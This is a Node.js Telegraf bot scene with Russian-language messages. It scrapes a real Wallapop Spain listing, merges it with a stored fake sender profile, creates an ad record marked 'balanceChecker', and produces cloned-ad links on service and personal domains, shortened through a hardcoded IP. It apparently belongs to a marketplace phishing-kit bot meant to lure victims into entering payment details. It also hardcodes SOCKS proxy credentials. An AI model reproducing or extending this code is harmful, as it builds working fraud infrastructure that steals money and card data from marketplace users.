const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, Profiles,MyDomains } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const myAd = require("../../commands/myAd");

const wallapop_es_domains = ["www.es.wallapop.com", "es.wallapop.com","www.wallapop.com", "wallapop.com"];

const SocksProxyAgent = require("socks-proxy-agent");
const torProxyAgent = new SocksProxyAgent('socks://SfKV9n:S5JVvm@45.136.174.130:8000')

const scene = new WizardScene(
  "create_link_wallapop_es_link",

  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "wallapop_es",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      log(ctx, "перешёл к созданию ссылки WALLAPOP.ES");
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);

      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  
  async (ctx) => {
    const wallapopUrl = ctx.match[0];

    ctx.scene.state.wallapopUrl = wallapopUrl;

    if (!ctx.scene.state.wallapopUrl) {
      // Если URL не был предварительно сохранён, запрашиваем его у пользователя
      await ctx.reply("Отправьте ссылку на объявление WALLAPOP.ES", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });

    } else {
      // Если URL уже сохранён, переходим к следующему шагу сцены (парсингу)
      return ctx.wizard.nextStep();
    }
  },
  async (ctx) => {
    try {
      var url;
      try {
          url = new URL(ctx.scene.state.wallapopUrl || ctx.message.text);
      } catch (err) {
          await ctx.replyOrEdit("❌ Введите валидную ссылку").catch((err) => err);
          return ctx.wizard.prevStep();
      }
      if (!wallapop_es_domains.includes(url.host)) {
        await ctx.replyOrEdit("❌ Введите ссылку на объявление WALLAPOP.ES").catch((err) => err);
        return ctx.wizard.prevStep();
    }

    
        log(ctx, `отправил ссылку для парсинга WALLAPOP.ES (${url.href})`);

        await ctx.scene.reply("🔄 Парсим объявление...").catch((err) => err);
        const ad = await axios.get(encodeURI(url.href)),
          $ = cheerio.load(ad.data);
        const imgElement = $("meta[name='og:image']").first();
        const photoURL = imgElement.attr("content");

        const priceSelectors = [
          ".item-detail-purchase-footer_ItemDetailPurchase__itemInfo--chunky__snLt5",
          ".item-detail-price_ItemDetailPrice--standard__TxPXr"
        ];

        const price = priceSelectors
          .map(sel => $(sel).first().text().trim())
          .find(text => text); // Первый непустой

        // ⬇️ Парсим title либо с основного блока, либо из meta
        let title = $(".d-md-none.item-detail_ItemDetailTwoColumns__mobileTitle__sKSaU.mt-2").text().trim();

        if (!title) {
          title = $('meta[name="og:title"]').attr("content")?.trim() || "";
        }

        const info = {
          title,
          price,
          adLink: url.href,
          photo: photoURL
        };
        if (!info.title || !info.price) {
          await ctx.scene
            .reply("❌ Не удалось спарсить объявление")
            .catch((err) => err);
          return ctx.scene.leave();
        }
      log(ctx, `спарсил объявление WALLAPOP.ES (${url.href})`);
      ctx.scene.state.data = info;

      const profiles = await Profiles.findAll({
        where: { userId: ctx.from.id },
      });

      var buttons = profiles.map((v) => [Markup.callbackButton(v.title, v.id)]);

      await ctx.scene.reply(`Выберите профиль`, {
        reply_markup: Markup.inlineKeyboard([
          ...buttons,
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);

      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      const profiles = await Profiles.findOne({
        where: { id: ctx.callbackQuery.data },
      });

      ctx.scene.state.data.address = profiles.address;
      ctx.scene.state.data.name = profiles.name;
      ctx.scene.state.data.phone = profiles.phone;

    
      const service = await Service.findOne({
        where: {
          code: "wallapop_es",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      // function generateId(length = 7) { // Set default length to 5
      //   const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
      //   let result = '';
      //   const charactersLength = characters.length;
      //   for (let i = 0; i < length; i++) {
      //     result += characters.charAt(Math.floor(Math.random() * charactersLength));
      //   }
      //   return result;
      // }
      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
                balanceChecker: true,

        ...ctx.scene.state.data,
        serviceCode: "wallapop_es",
      });

      const domains = await MyDomains.findOne({ 
        where: { userId: ctx.from.id }, 
      }); 
       
      let reductionUrl; 
       
      try { 
        const reduction = await axios.post( 
          "http://185.208.158.144/api/create", 
          { 
            target: `https://${service.domain}/${ad.id}`, 
            domain: service.shortlink || ctx.state.bot.shortlink, 
          }, 
          { timeout: 2000 } 
        ); 
       
        reductionUrl = reduction.data.url; 
      } catch (error) { 
        console.error("Ошибка при создании сокращенной ссылки:", error.message); 
       
        if (error.code === 'ECONNABORTED') { 
          console.warn("Запрос превысил допустимый тайм-аут."); 
        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') { 
          console.warn("Сервер сокращений недоступен."); 
        } else { 
          console.warn("Произошла непредвиденная ошибка:", error.message); 
        } 
       
        reductionUrl = null; // корректный fallback 
      } 
       
      const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null; 
       
      await ad.update({ 
        myDomainLink: personalDomainLink, 
        shortLink: reductionUrl, // используем переменную 
      }); 
       
log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`); 

// Собираем сообщение 
try {
  await myAd(ctx, ad.id);
} catch (err) {
  await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => {});
}
      ctx.updateType = "message";
      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
    }
  }
);

module.exports = scene;
